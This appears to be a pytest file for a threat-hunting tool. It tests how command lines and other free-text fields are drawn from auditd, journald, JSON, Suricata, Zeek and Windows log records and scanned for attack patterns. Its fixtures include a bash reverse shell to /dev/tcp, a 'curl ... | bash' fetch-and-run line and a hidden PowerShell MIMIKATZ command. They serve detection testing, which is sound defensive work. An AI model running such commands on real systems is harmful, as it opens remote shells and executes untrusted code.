"""Mention coverage: every offered record's free-text fields are scanned by a documented selection per family (never
a serialized record), audit fields no typed event reads and Windows records on a network target are offered, the
records outside the sweep's selection are fetched for the scan under a bounded budget, and a mention whose record a
finding also cites is shown with that finding, never dropped. Mentions never become findings, lanes or facts."""
from __future__ import annotations

import json
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from romulus.content.mention_patterns import load_mention_patterns
from romulus.hunt.mention_fields import (
    AUDITD,
    ECS_JSON,
    EVE,
    JOURNALD,
    JSON_RECORD,
    MAX_TEXTS,
    ZEEK,
    select_texts,
)
from romulus.hunt.mentions import SCANNED_ALL, MentionScanner
from romulus.sources.models import Window
from romulus.sources.profile import contract_from_types

FIXTURES = Path(__file__).parent / "data" / "mentions"
T0 = datetime(2024, 11, 18, 14, 0, tzinfo=UTC)
WINDOW = Window(start=T0, end=T0 + timedelta(minutes=5))
TARGET = "logs-linux-x"
SHELL = "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"
CONTRACT = contract_from_types(TARGET, {"@timestamp": "date", "event.dataset": "keyword", "host.name": "keyword",
                                        "message": "text", "event.module": "keyword", "input.type": "keyword"})


def _hex(text: str) -> str:
    return text.encode().hex().upper()


def _record(n: int, source: dict, host: str = "web1") -> dict:
    return {"_index": TARGET, "_id": f"c{n}",
            "_source": {"@timestamp": (T0 + timedelta(seconds=n)).isoformat(), "host": {"name": host}, **source}}


def _scanner(tmp_path) -> MentionScanner:
    return MentionScanner("h1", load_mention_patterns(FIXTURES), stage_dir=tmp_path, window=(WINDOW.start, WINDOW.end))


def _ids(scanner) -> list[tuple[str, str, str]]:
    """(pattern, host, the field the kept record was matched in) per kept group."""
    patterns = scanner.patterns.patterns
    out = []
    for row in scanner.ranked():
        query = json.loads(row[7])["query"]
        out.append((patterns[row[1]].id, row[2], query.split("matched the record's ", 1)[1].split(" in the ")[0]))
    return sorted(out)


# ---- the selection, family by family ------------------------------------------------------------------------------

def test_an_audit_proctitle_is_scanned_decoded_never_as_hex(tmp_path):
    line = (f"type=PROCTITLE msg=audit(1731938400.123:77): proctitle={_hex(SHELL.replace(' ', chr(0)))}")
    selection = select_texts({"message": line})
    assert selection.family == AUDITD and selection.complete
    assert selection.texts == [("PROCTITLE.proctitle", SHELL)]
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, {"message": line}), "x", False, ("proctitle",))], None)
    assert _ids(scanner) == [("mention.test_dev_tcp_redirect", "web1", "PROCTITLE.proctitle")]
    summary = scanner.summary()
    assert summary["status"] == SCANNED_ALL and summary["by_field"] == {"auditd:PROCTITLE.proctitle": 1}
    scanner.close()


def test_an_audit_user_command_and_execve_arguments_are_decoded():
    user_cmd = (f"type=USER_CMD msg=audit(1731938400.5:9): pid=4 uid=0 auid=1000 ses=2 msg='cwd=\"/root\" "
                f"cmd={_hex('curl http://198.51.100.2/x | bash')} exe=\"/usr/bin/sudo\" terminal=pts/0 res=success'")
    texts = dict(select_texts({"event": {"original": user_cmd}}).texts)
    assert texts["USER_CMD.cmd"] == "curl http://198.51.100.2/x | bash"
    execve = f'type=EXECVE msg=audit(1731938400.5:10): argc=3 a0="bash" a1="-c" a2={_hex("id; whoami")}'
    assert dict(select_texts({"message": execve}).texts)["EXECVE.argv"] == "bash -c id; whoami"
    # restricted to the process title, a record's other fields are not read
    assert select_texts({"message": execve}, only=("proctitle",)).texts == []


def test_a_journal_record_has_its_command_line_scanned_beside_its_message(tmp_path):
    journal = {"event": {"dataset": "systemd.journal"},
               "event.original": json.dumps({"MESSAGE": "started", "_CMDLINE": SHELL, "_COMM": "bash",
                                             "SYSLOG_IDENTIFIER": "logger", "_PID": "7"})}
    selection = select_texts(journal)
    assert selection.family == JOURNALD and selection.complete
    assert ("event.original#journal:_CMDLINE", SHELL) in selection.texts
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, journal), "x")], None)
    assert _ids(scanner) == [("mention.test_dev_tcp_redirect", "web1", "event.original#journal:_CMDLINE")]
    assert scanner.summary()["status"] == SCANNED_ALL
    scanner.close()


def test_a_json_record_without_message_is_scanned_by_its_command_line_field(tmp_path):
    ecs = {"event": {"original": json.dumps({"@timestamp": T0.isoformat(), "process": {
        "command_line": SHELL, "pid": 9}, "event": {"category": ["process"]}})}}
    selection = select_texts(ecs)
    assert selection.family == ECS_JSON and selection.complete
    assert selection.texts == [("event.original#process.command_line", SHELL)]
    # a JSON record of no catalogued family is never substring-matched: counted and named
    other = {"event": {"original": json.dumps({"cmd": SHELL})}}
    assert select_texts(other).texts == [] and select_texts(other).reason == JSON_RECORD
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, ecs), "x"), (_record(2, other), "x")], None)
    assert _ids(scanner) == [("mention.test_dev_tcp_redirect", "web1", "event.original#process.command_line")]
    summary = scanner.summary()
    assert summary["not_scanned"]["records"] == {JSON_RECORD: 1} and summary["status"] == "partial"
    scanner.close()


def test_suricata_eve_records_are_read_by_their_event_types_fields(tmp_path):
    http = {"event_type": "http", "src_ip": "10.0.0.5", "dest_ip": "203.0.113.9", "flow_id": 1,
            "http": {"hostname": "x.example", "url": "/a?c=bash%20-i", "http_user_agent": "MIMIKATZ/2.2"},
            "alert": {"signature": "ET MIMIKATZ rule text"}}
    selection = select_texts({"event.original": json.dumps(http)})
    assert selection.family == EVE and selection.complete
    assert [path for path, _text in selection.texts] == [
        "event.original#eve:http.hostname", "event.original#eve:http.url", "event.original#eve:http.http_user_agent"]
    dns = {"event_type": "dns", "src_ip": "10.0.0.5", "dns": {"version": 3, "queries": [
        {"rrname": "a.example"}, {"rrname": "b.example"}]}}
    assert [text for _path, text in select_texts({"event.original": json.dumps(dns)}).texts] == [
        "a.example", "b.example"]
    # counters have no free text: nothing to scan, and no coverage gap
    stats = select_texts({"event.original": json.dumps({"event_type": "stats", "flow_id": 1, "stats": {"x": 1}})})
    assert stats.no_text and stats.family == EVE
    # an event type outside the table is scanned by the table's fields, in part
    odd = select_texts({"event.original": json.dumps({"event_type": "newproto", "src_ip": "1.2.3.4",
                                                         "http": {"url": "/x"}})})
    assert odd.texts == [("event.original#eve:http.url", "/x")] and not odd.complete
    scanner = _scanner(tmp_path)
    records = [(_record(1, {"event.original": json.dumps(http)}), "x"),
               (_record(2, {"event.original": json.dumps({"event_type": "stats", "flow_id": 1})}), "x")]
    scanner.scan(TARGET, CONTRACT, records, None)
    summary = scanner.summary()
    assert _ids(scanner) == [("mention.test_mimikatz", "web1", "event.original#eve:http.http_user_agent")]
    assert summary["status"] == SCANNED_ALL and summary["records_without_free_text"] == {EVE: 1}
    scanner.close()


def test_zeek_records_are_read_by_their_logs_fields():
    http = {"_path": "http", "uid": "C1", "id.orig_h": "10.0.0.5", "uri": "/x", "user_agent": "curl/8",
            "resp_mime_types": ["text/html"]}
    selection = select_texts({"event.original": json.dumps(http)})
    assert selection.family == ZEEK and selection.complete
    assert selection.texts == [("event.original#zeek:uri", "/x"), ("event.original#zeek:user_agent", "curl/8")]
    unknown = select_texts({"event.original": json.dumps({"_path": "custom_log", "uid": "C2", "msg": "hello"})})
    assert unknown.texts == [("event.original#zeek:msg", "hello")] and not unknown.complete


def test_a_windows_record_without_a_rendered_message_is_read_by_its_event_data(tmp_path):
    source = {"winlog": {"channel": "Vendor/Operational", "event_id": 7, "event_data": {
        "CommandLine": "powershell -nop -w hidden -c MIMIKATZ", "SubjectUserSid": "S-1-5-18"}},
        "agent": {"type": "winlogbeat"}}
    selection = select_texts(source, windows=True)
    assert selection.texts == [("winlog.event_data.CommandLine", "powershell -nop -w hidden -c MIMIKATZ")]
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, source, host="ws1"), "x", True)], None)
    assert _ids(scanner) == [("mention.test_mimikatz", "ws1", "winlog.event_data.CommandLine")]
    assert scanner.summary()["by_telemetry"] == {"windows_text": 1}
    scanner.close()


def test_a_message_and_a_command_line_field_are_two_texts_but_one_mention(tmp_path):
    source = {"message": "process started", "process": {"command_line": SHELL, "name": "MIMIKATZ"}}
    selection = select_texts(source)
    assert [path for path, _text in selection.texts] == ["message", "process.command_line", "process.name"]
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, source), "x")], None)
    rows = list(scanner.ranked())
    # one record, one group: under its strongest pattern, the weaker one kept as metadata
    assert len(rows) == 1 and scanner.patterns.patterns[rows[0][1]].id == "mention.test_dev_tcp_redirect"
    assert [scanner.patterns.patterns[i].id for i in json.loads(rows[0][14])] == ["mention.test_mimikatz"]
    summary = scanner.summary()
    assert summary["lines_scanned"] == 3 and summary["records_scanned"] == 1 and summary["lines_matched"] == 1
    scanner.close()


def test_a_record_with_too_many_fields_or_text_past_the_bound_is_counted_in_part(tmp_path):
    from romulus.evidence.mention_match import MAX_SCAN_CHARS
    many = {"event.original": json.dumps({"event_type": "smtp", "src_ip": "1.2.3.4", "smtp": {
        "rcpt_to": [f"u{n}@example.org" for n in range(MAX_TEXTS + 5)]}})}
    selection = select_texts(many)
    assert len(selection.texts) == MAX_TEXTS and not selection.complete
    # the scan bound holds across a record's texts together
    long = {"message": "x" * (MAX_SCAN_CHARS - 10), "process": {"command_line": "MIMIKATZ " + "y" * 100}}
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, long), "x")], None)
    summary = scanner.summary()
    assert summary["not_scanned"]["lines_cut_at_bound"] == 1 and summary["status"] == "partial"
    assert summary["not_scanned"]["chars_past_bound"] == len("MIMIKATZ ") + 100 - 10
    scanner.close()


@pytest.mark.parametrize("source", [
    {"event": {"original": json.dumps({"MESSAGE": "x", "_CMDLINE": "MIMIKATZ"})}},
    {"event": {"original": json.dumps({"@timestamp": "t", "process": {"command_line": "MIMIKATZ"}})}},
])
def test_selected_fields_never_include_keys_or_structure(source):
    texts = [text for _path, text in select_texts(source).texts]
    assert all("{" not in text and "_CMDLINE" not in text and "command_line" not in text for text in texts)
